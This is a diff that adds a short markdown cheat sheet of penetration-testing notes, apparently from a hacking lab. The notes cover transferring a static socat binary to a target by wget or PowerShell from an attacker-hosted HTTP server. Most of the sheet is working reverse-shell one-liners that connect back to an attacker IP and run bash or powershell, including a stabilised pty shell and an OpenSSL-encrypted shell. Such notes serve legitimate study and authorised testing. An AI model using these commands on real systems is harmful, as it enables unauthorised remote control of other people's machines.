@@ -1,0 +1,16 @@
+**dont forget to make socat executable!!!!!**
+- download binary on attackbox [link](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
+- run python server `sudo python3 -m http.server 80`
+- download binary to target `wget <LOCAL-IP>/socat -O /tmp/socat`
+- on windows `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe`
+- `socat TCP-L:<port> -` listener
+- `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` windows
+- `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` linux
+- stable reverse tty shell
+	- ```socat TCP-L:<port> FILE:`tty`,raw,echo=0``` listener
+	- `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`on target 
+- encryted shell
+	- `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt` create cert
+	- `cat shell.key shell.crt > shell.pem`create pem file
+	- `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` listener
+	- `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`on target
